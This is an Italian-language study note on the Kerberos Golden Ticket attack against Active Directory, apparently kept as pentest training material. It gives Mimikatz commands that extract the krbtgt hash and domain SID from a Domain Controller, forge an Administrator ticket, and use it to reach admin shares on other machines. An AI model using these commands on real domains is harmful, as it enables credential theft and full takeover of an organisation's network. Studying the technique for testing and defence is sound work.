#Privesc_AD 

---
#### INDICE

- [[#Introduzione]]
- [[#Mimikatz]]
- [[#Uso del Golden Ticket]]

---
---
---
### Introduzione
L’attacco consiste nel generare *Ticket Granting Tickets (TGT) falsificati,* validi su qualsiasi servizio del dominio, grazie all’uso della chiave dell’account di sistema krbtgt.

Poiché Kerberos si basa su fiducia crittografica, chiunque possieda la chiave segreta dell’account `krbtgt` può creare TGT che i Domain Controller considerano **autentici**.

---
### Mimikatz
Una volta ottenuto l’accesso a un Domain Controller (es. tramite escalation di privilegi), è possibile estrarre la chiave `krbtgt`.

Comandi esemplificativi:

```
.\mimikatz.exe privilege::debug lsadump::lsa /inject /name:krbtgt
```

Questo comando estrae:

- L’**hash NTLM** dell’account `krbtgt`
- Il **SID** del dominio (identificativo univoco del contesto di dominio)

A questo punto si genera il **Golden Ticket**:

```
kerberos::golden /user:<utente> /domain:<dominio.local> /sid:<SID> /krbtgt:<hash> /id:500
```

L’`id:500` rappresenta l’**Administrator** built-in nel dominio.

---
### Uso del Golden Ticket
Una volta generato, il Golden Ticket può essere **iniettato** nella sessione corrente per ottenere un prompt autenticato con privilegi elevati:

```
misc::cmd
```

Da quel momento, è possibile accedere a **qualsiasi macchina del dominio** che accetta Kerberos:

```
dir \\DESKTOP-1\c$
```

Funziona anche se l’account non ha effettuato precedentemente login: il ticket è ritenuto valido dal KDC poiché firmato con la chiave `krbtgt`.